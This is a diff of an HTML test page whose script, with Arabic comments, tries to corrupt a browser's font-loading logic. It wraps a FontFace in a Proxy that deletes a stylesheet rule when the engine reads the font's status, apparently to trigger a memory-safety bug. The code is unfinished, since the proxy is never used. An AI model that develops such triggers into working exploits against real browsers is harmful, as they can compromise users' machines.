@@ -6,26 +6,28 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color: #0f0; font-family: monospace;">Testing...</div>
+    <div id="debug" style="color: #0f0; font-family: monospace;">Initiating...</div>
 
     <script>
         const debug = document.getElementById('debug');
 
         function trigger() {
-            // بيانات وهمية للخط
             let A = new FontFace('x', 'url(data:font/woff2;base64,d09GMgABAAAAA)');
-            
-            // حقن مباشر
-            A.then = function(resolve, reject) {
-                debug.innerText = "Intercepted!";
-                // الحذف هنا
-                document.getElementById('s').sheet.deleteRule(0);
-                return Promise.prototype.then.call(this, resolve, reject);
-            };
-
             document.fonts.add(A);
-            
-            // تحميل الخط
+
+            // نستخدم Proxy بدلاً من التعديل المباشر
+            // Proxy يعطينا سيطرة أكبر على العمليات التي يقوم بها المحرك على الكائن
+            let handler = {
+                get(target, prop, receiver) {
+                    if (prop === 'status') {
+                        // هنا نغير الـ status يدوياً لتخريب المنطق الداخلي
+                        document.getElementById('s').sheet.deleteRule(0);
+                    }
+                    return Reflect.get(...arguments);
+                }
+            };
+            let proxyA = new Proxy(A, handler);
+
             A.load().then(() => {
                 debug.innerText = "Done!";
             }).catch((e) => {
